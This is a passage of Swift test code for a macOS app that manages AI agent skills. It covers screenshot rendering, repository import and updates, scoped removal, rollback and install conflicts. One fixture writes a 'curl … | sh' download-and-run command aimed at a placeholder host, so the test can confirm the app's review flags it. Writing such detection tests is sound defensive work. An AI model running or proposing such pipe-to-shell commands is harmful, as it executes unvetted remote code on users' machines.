      ("global-light", AnyView(ContentView(sidebar: .global, skill: libraryOnlyName).environment(store))),
      ("global-narrow", AnyView(ContentView(sidebar: .global, skill: libraryOnlyName).environment(store))),
      ("library-saved", AnyView(ContentView(sidebar: .library, skill: prefix + "-renamed").environment(store))),
      ("library-saved-light", AnyView(ContentView(sidebar: .library, skill: prefix + "-renamed").environment(store))),
      ("library-saved-narrow", AnyView(ContentView(sidebar: .library, skill: prefix + "-renamed").environment(store))),
      ("global-outside-library", AnyView(ContentView(sidebar: .global).environment(store))),
      ("discovery-git", AnyView(ContentView(sidebar: .discovery).environment(store))),
      ("discovery-git-light", AnyView(ContentView(sidebar: .discovery).environment(store))),
      ("discovery-git-narrow", AnyView(ContentView(sidebar: .discovery).environment(store))),
      ("discovery-local", AnyView(ContentView(sidebar: .discovery, discoveryKind: .local).environment(store))),
      ("discovery-local-light", AnyView(ContentView(sidebar: .discovery, discoveryKind: .local).environment(store))),
      ("discovery-local-narrow", AnyView(ContentView(sidebar: .discovery, discoveryKind: .local).environment(store))),
      ("discovery-imported-local", AnyView(ContentView(sidebar: .repo(localLibrary.lastPathComponent)).environment(store))),
      ("discover-available", AnyView(RepositoryDetail(repository: repositoryEntry(discoverAvailable)).environment(store))),
      ("discover-local-available", AnyView(RepositoryDetail(repository: repositoryEntry(discoverLocalAvailable)).environment(store))),
      ("local-source-sidebar", AnyView(ContentView(sidebar: .localSource(pendingLocalSource.path)).environment(store))),
      ("discover-in-library", AnyView(RepositoryDetail(repository: repositoryEntry(discoverInLibrary)).environment(store))),
      ("discover-in-library-light", AnyView(RepositoryDetail(repository: repositoryEntry(discoverInLibrary)).environment(store))),
      ("unlinked-source", AnyView(ContentView(sidebar: .repo(unlinkedName), skill: unlinkedName).environment(store))),
      ("skillset", AnyView(ContentView(sidebar: .skillset(store.skillsets[0].id)).environment(store))),
      ("assignment-manager", AnyView(SkillsetAssignmentsSheet(skillsetID: store.skillsets[0].id).environment(store))),
      ("assignment-manager-light", AnyView(SkillsetAssignmentsSheet(skillsetID: store.skillsets[0].id).environment(store))),
      ("skillset-editor", AnyView(SkillsetEditor(skillset: store.skillsets[0]).environment(store))),
      ("skillset-preview", AnyView(SkillsetPreview(skillsetID: store.skillsets[0].id, tool: .amp, assigned: true).environment(store))),
      ("tool-skillsets", AnyView(ContentView(sidebar: .global, globalTool: .amp).environment(store))),
      ("suggestions", AnyView(ContentView(sidebar: .suggestions).environment(store))),
      ("settings", AnyView(SettingsView().environment(store))),
      ("plugins", AnyView(ContentView(sidebar: .plugins).environment(store))),
      ("plugin-detail", AnyView(PluginDetail(plugin: demoPlugin!).environment(store))),
    ] + reviewed.scenes + repositoryScenes.scenes + usabilityScenes + toolRemoval.scenes + skillsLockScenes + reportScenes
    try JSONEncoder().encode(scenes.map { $0.0 }).write(to: output.appending(path: "render-manifest.json"))
    for (name, view) in scenes {
      NSApp.appearance = NSAppearance(named: name.hasSuffix("-light") ? .aqua : .darkAqua)
      host.rootView = AnyView(view.id(name))
      window.setContentSize(CGSize(width: name.contains("narrow") ? 820 : 1180, height: 760))
      try await Task.sleep(for: .seconds(1))
      let installationFilter: ((Skill) -> Bool)?
      if name.hasPrefix("global") { let readers = Set(store.tools); installationFilter = { !$0.availableIn.isDisjoint(with: readers) && !$0.isSystemOnly(in: readers) } }
      else if name == "library" || name.hasPrefix("library-") { installationFilter = { $0.isInLibrary } }
      else { installationFilter = nil }
      if let installationFilter {
        func skillTables(_ view: NSView) -> [NSTableView] {
          if let table = view as? NSTableView { return [table] }
          return view.subviews.flatMap(skillTables)
        }
        let expected = store.skills.filter(installationFilter).count
        let content = window.contentView!
        guard let table = skillTables(content).max(by: {
          $0.convert($0.bounds, to: content).minX < $1.convert($1.bounds, to: content).minX
        }) else {
          print("LAYOUT \(name): sizing=\(host.sizingOptions), window=\(window.frame), content=\(content.frame), host=\(host.view.frame)")
          func frames(_ view: NSView, depth: Int = 0) {
            guard depth < 6 else { return }
            print("LAYOUT \(String(repeating: " ", count: depth))\(type(of: view)): frame=\(view.frame) hidden=\(view.isHidden)")
            for child in view.subviews { frames(child, depth: depth + 1) }
          }
          frames(content)
          throw CheckFailure.failed("Native skill list is unavailable for \(name)")
        }
        print("Native list for \(name): \(type(of: table)), \(table.numberOfRows) rows")
        try check(table.numberOfRows == expected, "\(name) native list matches its installation filter and source")
      }
      if name == "skills-sh-results" {
        // Return reaches `onSubmit(of: .search)` only through real key events, which this harness doesn't send.
        let searchField = window.toolbar?.items.lazy.compactMap { ($0 as? NSSearchToolbarItem)?.searchField }.first
        try check(searchField?.stringValue == "made up", "returning to skills.sh restores the last search text")
      }
      if name == "dashboard-library" {
        func scrollViews(_ view: NSView) -> [NSScrollView] {
          (view as? NSScrollView).map { [$0] } ?? view.subviews.flatMap(scrollViews)
        }
        if let scroll = scrollViews(window.contentView!).max(by: { $0.bounds.width < $1.bounds.width }),
           let document = scroll.documentView {
          let y = document.isFlipped ? max(0, document.bounds.height - scroll.contentView.bounds.height) : 0
          scroll.contentView.scroll(to: NSPoint(x: 0, y: y))
          scroll.reflectScrolledClipView(scroll.contentView)
          try await Task.sleep(for: .milliseconds(200))
        } else { throw CheckFailure.failed("Report scroll view is unavailable") }
      }
      if name.contains("inspector-sheet") { try check(window.attachedSheet != nil, "native repository inspector sheet opens") }
      let content = name.contains("inspector-sheet") ? window.attachedSheet!.contentView!.superview! : window.contentView!.superview!
      let bitmap = content.bitmapImageRepForCachingDisplay(in: content.bounds)!
      content.cacheDisplay(in: content.bounds, to: bitmap)
      try bitmap.representation(using: .png, properties: [:])!.write(to: output.appending(path: "\(name).png"))
      print("PASS: rendered \(name)")
      if name == "repository-inspector-inline" {
        let before = repositoryBackRequests
        let event = NSEvent.keyEvent(with: .keyDown, location: .zero, modifierFlags: [], timestamp: ProcessInfo.processInfo.systemUptime,
          windowNumber: window.windowNumber, context: nil, characters: "\u{1b}", charactersIgnoringModifiers: "\u{1b}", isARepeat: false, keyCode: 53)!
        _ = window.performKeyEquivalent(with: event)
        try check(repositoryBackRequests > before, "Escape invokes Back to repository through the native keyboard shortcut")
      }
    }

    // A same-name independent copy must survive repository removal.
    try writeSkill(Tool.amp.skillsFolder.appending(path: prefix), name: prefix)
    var trashed = try SkillInstaller.removeRepo(name: destination.lastPathComponent)
    trashed += redownloadTrash
    trashed += skillsetTrash
    trashed += installationTrash
    trashed += toolRemoval.trash
    SkillInstaller.discardRepoUpdate(reviewed.update)
    trashed += try SkillInstaller.removeRepo(name: reviewed.repo)
    trashed += reviewed.trash
    trashed += repositoryScenes.trash
    trashed += refreshTrash
    trashed += configMoveTrash
    try check(fm.fileExists(atPath: Tool.amp.skillsFolder.appending(path: prefix).path), "repository removal preserves independent copies")
    try check(!fm.fileExists(atPath: Tool.codex.skillsFolder.appending(path: prefix).path), "repository removal removes its agent links")
    let removable = SkillScanner.scan().first { $0.name == prefix + "-explicit" }!
    trashed += try SkillInstaller.remove(removable.removableCopies)
    try check(!fm.fileExists(atPath: removable.skillFile.path), "managed uninstall succeeds")
    let bulkNames = [prefix + "-bulk-one", prefix + "-bulk-two"]
    for name in bulkNames {
      try writeSkill(Tool.amp.skillsFolder.appending(path: name), name: name)
    }
    let bulkSkills = SkillScanner.scan().filter { bulkNames.contains($0.name) }
    let bulkRemoval = Removal.uninstall(bulkSkills, selectedCount: 3)
    try check(bulkRemoval.copies.count == 2 && bulkRemoval.title.contains("2 selected skills")
      && bulkRemoval.message().contains("1 selected skill has no removable copies"),
      "bulk uninstall confirmation counts removable and protected selections")
    trashed += try SkillInstaller.remove(bulkRemoval.copies)
    try check(bulkNames.allSatisfy { !fm.fileExists(atPath: Tool.amp.skillsFolder.appending(path: $0).path) },
      "bulk uninstall moves every selected user skill to Trash")
    // Clean up only the exact paths returned for this run's made-up artifacts.
    for item in Set(trashed) {
      if (try? fm.attributesOfItem(atPath: item.path)) != nil { try fm.removeItem(at: item) }
    }
  }

  @MainActor
  static func checkToolRemoval(_ store: AppStore, prefix: String) throws -> (trash: [URL], scenes: [(String, AnyView)]) {
    let fm = FileManager.default
    let name = prefix + "-tool-removal"
    let library = Paths.at(".config/quartermaster/skills/tool-removal/\(name)")
    let ampLink = Tool.amp.skillsFolder.appending(path: name)
    let codexCopy = Tool.codex.skillsFolder.appending(path: name)
    try writeSkill(library, name: name)
    try fm.createSymbolicLink(at: ampLink, withDestinationURL: library)
    try writeSkill(codexCopy, name: name)
    let installed = SkillScanner.scan().first { $0.name == name }!
    let removal = Removal.from(.amp, skills: [installed], selectedCount: 1)!
    try check(removal.actionLabel == "Remove from Amp…" && !removal.isShared && removal.copies.map(\.folder) == [ampLink],
      "tool action plans only the selected tool's link")
    var trash = try SkillInstaller.remove(removal.copies)
    try check(fm.fileExists(atPath: library.appending(path: "SKILL.md").path)
      && fm.fileExists(atPath: codexCopy.appending(path: "SKILL.md").path)
      && (try? fm.destinationOfSymbolicLink(atPath: ampLink.path)) == nil,
      "scoped Trash removal preserves the Library and independent tool installation")
    let remaining = SkillScanner.scan().first { $0.name == name }!
    try check(remaining.availableIn.contains(.codex) && !remaining.availableIn.contains(.amp),
      "scanner reflects scoped removal without losing another tool")
    try fm.createSymbolicLink(at: ampLink, withDestinationURL: library)

    let sharedName = prefix + "-shared-removal"
    let sharedFolder = Paths.at(".agents/skills/\(sharedName)")
    let protectedFolder = Paths.at(".codex/skills/.system/\(sharedName)")
    try writeSkill(sharedFolder, name: sharedName)
    try writeSkill(protectedFolder, name: sharedName)
    let shared = SkillScanner.scan().first { $0.name == sharedName }!
    let sharedRemoval = Removal.from(.codex, skills: [shared], selectedCount: 1)!
    let sharedMessage = sharedRemoval.message()
    try check(sharedRemoval.actionLabel.hasPrefix("Remove from Codex and ") && sharedRemoval.confirmationLabel == sharedRemoval.actionLabel.replacingOccurrences(of: "…", with: "")
      && sharedMessage.contains("Pi") && sharedMessage.contains("Codex can still load"),
      "shared confirmation names disabled readers and protected access that remains")
    trash += try SkillInstaller.remove(sharedRemoval.copies)
    let protectedOnly = SkillScanner.scan().first { $0.name == sharedName }!
    try check(!fm.fileExists(atPath: sharedFolder.path) && fm.fileExists(atPath: protectedFolder.appending(path: "SKILL.md").path)
      && protectedOnly.availableIn == [.codex] && Removal.from(.codex, skills: [protectedOnly], selectedCount: 1) == nil,
      "shared Trash removal preserves built-in access and has no protected-only removal action")

    let amp = installed.copies.first { $0.folder == ampLink }!
    let duplicate = Skill(name: name, description: installed.description, copies: installed.copies + [amp])
    let batch = Removal.from(.amp, skills: [duplicate, protectedOnly], selectedCount: 2)!
    let batchMessage = batch.message()
    try check(batch.copies.count == 1 && batch.skills.count == 1
      && batchMessage.contains("1 selected skill has no removable copies read by Amp")
      && batchMessage.contains("Cursor and Codex can still load")
      && !batchMessage.contains("Cursor and Codex will stop loading"),
      "mixed batch deduplicates paths, skips protected selections and reports only its planned copies")

    let physicalName = prefix + "-physical-removal"
    let physical = Tool.codex.skillsFolder.appending(path: physicalName)
    let dependent = Tool.amp.skillsFolder.appending(path: physicalName)
    let independent = Tool.pi.skillsFolder.appending(path: physicalName)
    try writeSkill(physical, name: physicalName)
    try fm.createSymbolicLink(at: dependent, withDestinationURL: physical)
    try writeSkill(independent, name: physicalName)
    let physicalSkill = SkillScanner.scan().first { $0.name == physicalName }!
    let physicalRemoval = Removal.from(.codex, skills: [physicalSkill], selectedCount: 1)!
    try check(Set(physicalRemoval.copies.map(\.folder.path)) == [physical.path, dependent.path] && physicalRemoval.affectedTools.contains(.amp),
      "physical source plan includes dependent links and their readers")
    trash += try SkillInstaller.remove(physicalRemoval.copies)
    try check(!fm.fileExists(atPath: physical.path) && (try? fm.destinationOfSymbolicLink(atPath: dependent.path)) == nil
      && fm.fileExists(atPath: independent.appending(path: "SKILL.md").path),
      "physical source Trash removal takes dependent links and keeps independent copies")

    try writeSkill(sharedFolder, name: sharedName)
    let restored = SkillScanner.scan()
    let scenes: [(String, AnyView)] = [
      ("tool-removal-detail", AnyView(SkillDetail(skill: restored.first { $0.name == name }!, context: .global(.amp)).environment(store))),
      ("shared-removal-detail", AnyView(SkillDetail(skill: restored.first { $0.name == sharedName }!, context: .global(.codex)).environment(store))),
    ]
    return (trash, scenes)
  }

  struct ReviewScenes {
    let trash: [URL]
    let repo: String
    let update: RepoUpdate
    let scenes: [(String, AnyView)]
  }

  @MainActor
  static func checkRepositoryWorkflows(_ store: AppStore, prefix: String, home: URL) async throws -> (trash: [URL], scenes: [(String, AnyView)]) {
    let fm = FileManager.default
    let remote = home.appending(path: "fixtures/\(prefix)-git")
    let sharedName = prefix + "-repository-skill"
    try writeSkill(remote.appending(path: "nested/first"), name: sharedName, tools: "[codex]")
    try writeSkill(remote.appending(path: "nested/second"), name: sharedName)
    _ = try await RepositoryGit.run(["init", "-b", "main", remote.path])
    _ = try await RepositoryGit.run(["-C", remote.path, "add", "."])
    _ = try await RepositoryGit.run(["-C", remote.path, "-c", "user.name=Demo", "-c", "user.email=demo@example.invalid", "commit", "-m", "Made-up initial skills"])
    _ = try await RepositoryGit.run(["-C", remote.path, "tag", "v1"])
    let source = RepositorySource.git(remote.absoluteString)
    let id = RepositoryID(source: source)
    let catalog = RegistrySkill(name: "Demo Git repository", description: "Nested skills and version controls", repo: source.address, tools: nil, author: "Demo")
    store.registrySkills.append(catalog)
    await store.reloadRepositories()
    let available = store.repositories.first { $0.id == id }!
    let foldersBefore = Set((try? fm.contentsOfDirectory(atPath: RepositoryLibrary.managedRoot.path)) ?? [])
    store.loadRepositoryPreview(available)
    await store.repositoryTasks[id]?.value
    try check(store.repositorySkills(available).count == 2, "repository preview preserves nested same-name skills by path")
    try check(Set((try? fm.contentsOfDirectory(atPath: RepositoryLibrary.managedRoot.path)) ?? []) == foldersBefore,
      "app preview leaves the Library unchanged")
    try check(!fm.fileExists(atPath: Tool.codex.skillsFolder.appending(path: sharedName).path), "app preview creates no agent links")
    let reviewedCommit = store.repositoryPreviews[id]!.commit
    await store.importRepository(available)
    let imported = store.repositories.first { $0.id == id }!
    try check(imported.snapshot?.commit == reviewedCommit && store.repositoryPreviews[id] == nil,
      "app imports the exact preview and releases its temporary files")
    try check(store.repositorySkills(imported).count == 2 && !fm.fileExists(atPath: Tool.codex.skillsFolder.appending(path: sharedName).path),
      "Add to Library keeps all skills without supported-tools auto-linking")
    let selected = store.repositorySkills(imported).first { $0.relativePath == "nested/second" }!
    let scoped = store.scopedSkill(selected)
    let selectedLink = Tool.amp.skillsFolder.appending(path: SkillInstaller.slug(selected.skill.name))
    try check(scoped.primary.resolved == selected.copy.resolved && scoped.copies.allSatisfy { $0.resolved == selected.copy.resolved },
      "repository skill inspection stays bound to the selected same-name copy")
    await store.add(scoped, to: .amp, from: selected.copy, reviewed: true)
    try check(selectedLink.resolvingSymlinksInPath().path == selected.copy.resolved.path,
      "adding a same-name repository skill installs the chosen path")
    _ = try await RepositoryGit.run(["-C", remote.path, "-c", "user.name=Demo", "-c", "user.email=demo@example.invalid", "commit", "--allow-empty", "-m", "Made-up version-only update"])
    let updateCount = await store.checkAllRepositories()
    try check(store.repositoryChecks[id]?.status == .updateAvailable && imported.snapshot?.commit == reviewedCommit,
      "batch checks detect commit-only updates without replacing Library files")
    let summary = store.repositoryCheckSummary ?? ""
    try check(updateCount >= 1 && store.repositoryCheckProgress == nil && !store.isCheckingRepositories
      && summary.contains(updateCount == 1 ? "1 repository has an update." : "\(updateCount) repositories have updates.")
      && summary.contains("local folder"),
      "checking all repositories reports how many have updates and why local folders are skipped")
    await store.reviewRepositoryUpdate(imported)
    let versionUpdate = store.pendingRepoUpdate!
    try check(versionUpdate.hasChanges && versionUpdate.changed.isEmpty && versionUpdate.newCommit != reviewedCommit,
      "app review includes a commit-only version change")
    _ = await store.finishRepoUpdate(apply: false)
    try check(store.pendingRepoUpdate == nil && !fm.fileExists(atPath: versionUpdate.staged.path), "cancelling review discards staging")
    await store.reviewRepositoryUpdate(imported)
    var trash = await store.finishRepoUpdate(apply: true)
    let updated = store.repositories.first { $0.id == id }!
    try check(updated.snapshot?.commit != reviewedCommit && fm.fileExists(atPath: selectedLink.appending(path: "SKILL.md").path),
      "app applies version-only updates while preserving linked skills")
    await store.checkRepository(updated)
    try check(store.repositoryChecks[id]?.status == .upToDate, "app clears update availability after replacement")
    await store.reviewRepositoryUpdate(updated, ref: .tag(name: "v1"))
    trash += await store.finishRepoUpdate(apply: true)
    let pinned = store.repositories.first { $0.id == id }!
    await store.checkRepository(pinned)
    try check(pinned.snapshot?.ref.isPinned == true && pinned.snapshot?.commit == reviewedCommit && store.repositoryChecks[id]?.status == .pinned,
      "app version selection pins a tag through the review workflow")
    let missingPath = home.appending(path: "fixtures/\(prefix)-retry")
    let missing = RepositoryEntry(id: RepositoryID(source: .local(missingPath.path)), name: "Demo retry folder", description: "Load failure and retry", source: .local(missingPath.path), catalog: nil)
    store.loadRepositoryPreview(missing)
    await store.repositoryTasks[missing.id]?.value
    try check(store.repositoryErrors[missing.id] != nil && store.repositoryPreviews[missing.id] == nil, "failed app previews retain an inline error")
    try writeSkill(missingPath, name: "demo-retry")
    store.loadRepositoryPreview(missing)
    await store.repositoryTasks[missing.id]?.value
    try check(store.repositoryErrors[missing.id] == nil && store.repositoryPreviews[missing.id]?.skills.count == 1,
      "app preview retry recovers after a missing folder is restored")
    if let preview = store.repositoryPreviews.removeValue(forKey: missing.id) { RepositoryLibrary.discard(preview) }
    let largeFolder = home.appending(path: "fixtures/demo-large-repository")
    for index in 0..<500 { try writeSkill(largeFolder.appending(path: "skills/demo-\(index)"), name: "demo-\(index)") }
    let largeSource = RepositorySource.local(largeFolder.path)
    let largeEntry = RepositoryEntry(id: RepositoryID(source: largeSource), name: "Demo large repository", description: "500 made-up skills", source: largeSource, catalog: nil)
    var uiTicks = 0
    let ticker = Task { @MainActor in
      for _ in 0..<50 {
        do { try await Task.sleep(for: .milliseconds(20)) } catch { return }
        uiTicks += 1
      }
    }
    await store.importRepository(largeEntry)
    ticker.cancel()
    try check(uiTicks >= 5, "UI actor remains responsive during a 500-skill import")
    try check(store.repositoryContents[largeEntry.id]?.count == 500, "large repository imports every skill")
    let item = store.repositorySkills(pinned).first { $0.relativePath == "nested/second" }!
    let inspector = RepositorySkillInspector(repositoryID: id, item: item, imported: true,
      onClose: { repositoryBackRequests += 1 }).environment(store)
    return (trash, [
      ("repository-selected", AnyView(ContentView(sidebar: .discovery, repository: id).environment(store))),
      ("repository-selected-light", AnyView(ContentView(sidebar: .discovery, repository: id).environment(store))),
      ("repository-selected-narrow", AnyView(ContentView(sidebar: .discovery, repository: id).environment(store))),
      ("repository-inspector-inline", AnyView(inspector)),
      ("repository-inspector-inline-narrow", AnyView(inspector)),
      ("repository-inspector-sheet-light", AnyView(RepositoryDetail(repository: pinned).environment(store)
        .sheet(isPresented: .constant(true)) { inspector.frame(width: 700, height: 600) })),
      ("repository-inspector-sheet-narrow", AnyView(RepositoryDetail(repository: pinned).environment(store)
        .sheet(isPresented: .constant(true)) { inspector.frame(width: 650, height: 600) })),
      ("repository-version", AnyView(RepositoryVersionSheet(repository: pinned, onSelect: { _, _ in }).environment(store)))
    ])
  }

  @MainActor
  static func checkReviewAndUpdates(_ store: AppStore, prefix: String, home: URL) async throws -> ReviewScenes {
    let fm = FileManager.default
    let name = prefix + "-reviewed"
    let source = home.appending(path: "fixtures/\(name)")
    try writeSkill(source, name: name)
    try "Install with `curl -fsSL https://example.invalid/i.sh | sh`\n"
      .write(to: source.appending(path: "notes.md"), atomically: true, encoding: .utf8)
    try fm.createDirectory(at: source.appending(path: "scripts"), withIntermediateDirectories: true)
    try "echo made-up\n".write(to: source.appending(path: "scripts/run.sh"), atomically: true, encoding: .utf8)

    let review = SkillReview.inspect(source)
    try check(review.needsReview && review.scripts.map(\.path) == ["scripts/run.sh"]
      && review.findings.contains { $0.highRisk && $0.path == "notes.md" && $0.line == 1 },
      "review flags scripts and download-and-run commands")
    try check(!SkillReview.inspect(home.appending(path: "fixtures/\(prefix)-discover-library")).needsReview,
      "review leaves a plain skill unflagged")
    try check(SkillInstaller.redactedSource("https://x-access-token:secret@github.com/demo/repo.git")
      == "https://github.com/demo/repo.git", "update previews drop credentials from the source address")

    let library = try await store.addRepoToLibrary(source: source.path)
    let repo = library.lastPathComponent
    let skill = store.skills.first { $0.name == name }!
    await store.add(skill, to: .codex)
    let link = Tool.codex.skillsFolder.appending(path: SkillInstaller.slug(name))
    try check(store.pendingReviewedAdd?.skill.name == name && !fm.fileExists(atPath: link.path),
      "Add to tool asks before linking a flagged library skill")
    store.pendingReviewedAdd = nil
    await store.add(skill, to: .codex, reviewed: true)
    try check(fm.fileExists(atPath: link.appending(path: "SKILL.md").path), "Add Anyway links the reviewed skill")
    let linked = store.skills.first { $0.name == name }!
    await store.add(linked, to: .amp)
    try check(store.pendingReviewedAdd != nil && !fm.fileExists(atPath: Tool.amp.skillsFolder.appending(path: SkillInstaller.slug(name)).path),
      "Add to tool still asks after the skill has a tool link into the Library")
    store.pendingReviewedAdd = nil

    try "echo changed\n".write(to: source.appending(path: "scripts/run.sh"), atomically: true, encoding: .utf8)
    try "new\n".write(to: source.appending(path: "added.txt"), atomically: true, encoding: .utf8)
    try fm.removeItem(at: source.appending(path: "notes.md"))
    let before = SkillReview.fingerprints(library)
    let preview = try await SkillInstaller.prepareRepoUpdate(name: repo)
    try check(preview.added == ["added.txt"] && preview.changed == ["scripts/run.sh"] && preview.removed == ["notes.md"]
      && preview.review.scripts.map(\.path) == ["scripts/run.sh"],
      "update preview lists added, changed and removed files with their review")
    try check(SkillReview.fingerprints(library) == before && fm.fileExists(atPath: preview.staged.path),
      "preparing an update leaves the Library copy unchanged")
    SkillInstaller.discardRepoUpdate(preview)
    try check(SkillReview.fingerprints(library) == before && !fm.fileExists(atPath: preview.staged.path),
      "discarding an update removes the staged copy only")

    let stale = try await SkillInstaller.prepareRepoUpdate(name: repo)
    try "local edit\n".write(to: library.appending(path: "edited.txt"), atomically: true, encoding: .utf8)
    do {
      try SkillInstaller.applyRepoUpdate(stale)
      throw CheckFailure.failed("applying a stale update should fail")
    } catch SkillInstaller.RepoUpdateFailure.changedSincePreview(_) {}
    try check(fm.fileExists(atPath: library.appending(path: "edited.txt").path) && !fm.fileExists(atPath: stale.staged.path),
      "an update refuses a Library copy changed since the preview")
    try fm.removeItem(at: library.appending(path: "edited.txt"))

    await store.previewRepoUpdate(name: repo)
    try check(store.pendingRepoUpdate?.hasChanges == true, "Refresh shows the update preview")
    await store.refreshSkills()
    try check(!store.skills.contains { $0.copies.contains { $0.folder.path.contains("-staged-") } }
      && !store.managedRepos.contains { $0.contains("-staged-") },
      "an open update preview's staged copy stays out of the skill list and Sources")
    let updateTrash = await store.finishRepoUpdate(apply: true)
    try check(store.pendingRepoUpdate == nil && fm.fileExists(atPath: library.appending(path: "added.txt").path)
      && fm.fileExists(atPath: link.appending(path: "SKILL.md").path),
      "applying the preview updates the Library copy and keeps the agent link")

    try check(!updateTrash.isEmpty, "applying the preview returns the previous copy's Trash location")

    let leftover = library.deletingLastPathComponent().appending(path: ".\(repo)-staged-\(UUID().uuidString)")
    try fm.createDirectory(at: leftover, withIntermediateDirectories: true)
    try fm.setAttributes([.modificationDate: Date().addingTimeInterval(-48 * 60 * 60)], ofItemAtPath: leftover.path)
    try "more\n".write(to: source.appending(path: "more.txt"), atomically: true, encoding: .utf8)
    let renderUpdate = try await SkillInstaller.prepareRepoUpdate(name: repo)
    try check(!fm.fileExists(atPath: leftover.path), "preparing an update removes staging left by an earlier quit")
    let request = PendingReviewedAdd(skill: store.skills.first { $0.name == name }!, tool: .amp, source: nil,
      folder: library, review: SkillReview.inspect(library))
    return ReviewScenes(trash: updateTrash, repo: repo, update: renderUpdate, scenes: [
      ("repo-update", AnyView(RepoUpdateSheet(update: renderUpdate).environment(store))),
      ("reviewed-add", AnyView(ReviewedAddSheet(request: request).environment(store))),
      ("skill-contents", AnyView(ContentView(skill: name).environment(store))),
    ])
  }

  @MainActor
  static func checkMoveAndRenameSafety(prefix: String, home: URL) throws -> [URL] {
    let fm = FileManager.default
    func scanned(_ name: String) -> Skill { SkillScanner.scan().first { $0.name == name }! }
    func link(_ url: URL) -> String? { try? fm.destinationOfSymbolicLink(atPath: url.path) }

    let twinName = prefix + "-twin"
    let twins = [Tool.claude, .codex].map { $0.skillsFolder.appending(path: twinName) }
    for folder in twins { try writeSkill(folder, name: twinName) }
    let moved = try SkillInstaller.moveToCentral(scanned(twinName))
    try check(moved.trashed.count == 1 && moved.trashed[0].path.contains("/.Trash/"),
      "Move to Library sends an identical independent copy to the Trash instead of deleting it")
    try check(twins.allSatisfy { link($0) == moved.destination.path }, "Move to Library links every agent folder to the moved Library folder")

    let outsideName = prefix + "-outside"
    let outside = home.appending(path: "fixtures/\(outsideName)")
    let outsideLink = Tool.claude.skillsFolder.appending(path: outsideName)
    try writeSkill(outside, name: outsideName)
    try fm.createSymbolicLink(at: outsideLink, withDestinationURL: outside)
    let linkOnly = scanned(outsideName)
    var refused = false
    do { try SkillInstaller.moveToCentral(linkOnly) } catch { refused = true }
    try check(!SkillInstaller.canMoveToCentral(linkOnly) && refused
      && fm.fileExists(atPath: outside.appending(path: "SKILL.md").path) && link(outsideLink) == outside.path,
      "Move to Library refuses a skill that links to a folder outside the skills folders and leaves that folder in place")

    let locked = Tool.gemini.skillsFolder
    try fm.createDirectory(at: locked, withIntermediateDirectories: true)
    let undoName = prefix + "-undo"
    let undoSource = Tool.claude.skillsFolder.appending(path: undoName)
    try writeSkill(undoSource, name: undoName)
    try writeSkill(locked.appending(path: undoName), name: undoName)
    let renameName = prefix + "-renameundo"
    let renameSource = Tool.claude.skillsFolder.appending(path: renameName)
    try writeSkill(renameSource, name: renameName)
    try fm.createSymbolicLink(at: locked.appending(path: renameName), withDestinationURL: renameSource)
    let undoSkill = scanned(undoName), renameSkill = scanned(renameName)
    try fm.setAttributes([.posixPermissions: 0o555], ofItemAtPath: locked.path)
    var moveFailed = false, renameFailed = false
    do { try SkillInstaller.moveToCentral(undoSkill) } catch { moveFailed = true }
    do { try SkillInstaller.rename(renameSkill, to: renameName + "-new", among: SkillScanner.scan()) } catch { renameFailed = true }
    try fm.setAttributes([.posixPermissions: 0o755], ofItemAtPath: locked.path)
    try check(moveFailed && link(undoSource) == nil && fm.fileExists(atPath: undoSource.appending(path: "SKILL.md").path)
      && !fm.fileExists(atPath: Paths.at(".config/quartermaster/skills/\(undoName)").path)
      && fm.fileExists(atPath: locked.appending(path: "\(undoName)/SKILL.md").path),
      "a failed Move to Library puts the folder back and keeps every copy")
    let renamedText = try String(contentsOf: renameSource.appending(path: "SKILL.md"), encoding: .utf8)
    try check(renameFailed && renamedText.contains("name: \(renameName)\n")
      && !fm.fileExists(atPath: Tool.claude.skillsFolder.appending(path: renameName + "-new").path)
      && link(locked.appending(path: renameName)) == renameSource.path,
      "a failed rename restores the folder name, the links and the SKILL.md name")

    for url in twins + [outsideLink, outside, moved.destination, undoSource, locked.appending(path: undoName), renameSource, locked.appending(path: renameName)] {
      try? fm.removeItem(at: url)
    }
    return moved.trashed
  }

  @MainActor
  static func checkInstallConflicts(_ store: AppStore, prefix: String) async throws -> [URL] {
    let fm = FileManager.default
    let name = prefix + "-replace"
    let sourceFolder = Paths.at(".config/quartermaster/skills/\(name)/\(name)")
    let destination = Tool.amp.skillsFolder.appending(path: name)
    try writeSkill(sourceFolder, name: name)
    try writeSkill(destination, name: name + "-old")
    let original = try String(contentsOf: destination.appending(path: "SKILL.md"), encoding: .utf8)
    let skill = SkillScanner.scan().first { $0.name == name }!
    let source = SkillInstaller.defaultSource(for: skill)!
    await store.add(skill, to: .amp, from: source)
    guard let conflict = store.addConflict else { throw CheckFailure.failed("existing installation presents a conflict") }
    store.addConflict = nil
    try check(conflict.destination.path == destination.path && conflict.source.resolved.path == sourceFolder.path,
      "install conflict identifies the existing entry and selected source")
    let kept = try String(contentsOf: destination.appending(path: "SKILL.md"), encoding: .utf8)
    try check(kept == original,
      "keeping an installation leaves its files unchanged")

    try "user edit".write(to: destination.appending(path: "notes.txt"), atomically: true, encoding: .utf8)
    do {
      _ = try SkillInstaller.replace(conflict)
      throw CheckFailure.failed("replacement accepted a changed installation")
    } catch SkillInstaller.Failure.changedOnDisk {
      print("PASS: replacement refuses an installation changed after confirmation opened")
    }
    try check(fm.fileExists(atPath: destination.appending(path: "notes.txt").path), "changed installation remains intact")
    let fresh: SkillInstaller.AddConflict
    do {
      _ = try SkillInstaller.add(skill, to: .amp, from: source)
      throw CheckFailure.failed("existing installation did not conflict")
    } catch let conflict as SkillInstaller.AddConflict { fresh = conflict }
    let result = try SkillInstaller.replace(fresh)
    var trashed = result.trashed.map { [$0] } ?? []
    try check(destination.resolvingSymlinksInPath().path == sourceFolder.path, "replacement links the selected source")
    guard let backup = result.trashed else { throw CheckFailure.failed("replacement returned no Trash backup") }
    try check(fm.fileExists(atPath: backup.appending(path: "notes.txt").path), "replacement preserves the old folder and supporting files in Trash")
    let unchanged = try SkillInstaller.add(skill, to: .amp, from: source)
    try check(unchanged == destination, "adding an already-correct link succeeds without conflict")

    let rollback = Tool.amp.skillsFolder.appending(path: prefix + "-rollback")
    try writeSkill(rollback, name: prefix + "-rollback")
    do {
      _ = try SkillInstaller.replacingInstallation(at: rollback) { throw CheckFailure.failed("simulated installation failure") }
      throw CheckFailure.failed("rollback test unexpectedly installed")
    } catch CheckFailure.failed(let message) {
      try check(message == "simulated installation failure", "replacement returns the original failure after rollback")
    }
    try check(fm.fileExists(atPath: rollback.appending(path: "SKILL.md").path), "failed installation restores the old folder from Trash")

    let linkName = prefix + "-replace-link"
